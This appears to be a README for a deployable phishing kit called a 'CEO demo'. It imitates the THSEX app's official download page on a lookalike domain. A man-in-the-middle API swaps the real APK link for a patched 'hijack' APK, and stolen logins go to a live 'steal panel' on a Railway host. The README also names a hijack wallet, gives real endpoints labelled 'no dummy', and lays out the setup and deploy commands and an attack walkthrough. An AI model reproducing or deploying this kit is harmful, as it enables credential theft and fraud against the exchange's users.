# THSEX MITM Download Attack — CEO Demo (Vercel)

End-to-end live proof: real official URL → poisoned `/api/downloadlink` → **THSEX6401.apk** → Railway steal panel.

## Setup

```bash
cd thsex_steal_demo/download_phish_next
npm install
npm run setup    # copies THSEX6401.apk + extracts real button images from WGT
npm run dev
```

## CEO URLs (after deploy)

| Path | Purpose |
|------|---------|
| `/ceo` | Full attack chain dashboard |
| `/pages/downapp/index` | **Live MITM demo** — real URL chrome + poisoned API |
| `/api/real/downloadlink` | Unmodified THSEX API response |
| `/api/proxy/downloadlink` | MITM — swaps CDN URL to hijack APK |
| `/THSEX6401.apk` | Patched hijack APK (37MB) |
| `/panel` | Embedded Railway steal panel |

## Deploy Vercel

```bash
npm run setup
npx vercel --prod
```

Set project name e.g. `thsexcex-online` for realistic path demo.

## CEO call flow

1. Open `/pages/downapp/index` on phone
2. Show address bar: `thsexcex.online/#/pages/downapp/index`
3. CEO panel shows real CDN URL → hijack APK URL swap
4. Tap Download → install THSEX6401.apk
5. Login → https://web-production-682ba.up.railway.app/panel
6. Deposit shows wallet `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`

## Real config (no dummy)

- Steal panel: `web-production-682ba.up.railway.app`
- Hijack wallet: `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`
- Real API: `api.thsexcex.com/api/downloadlink`
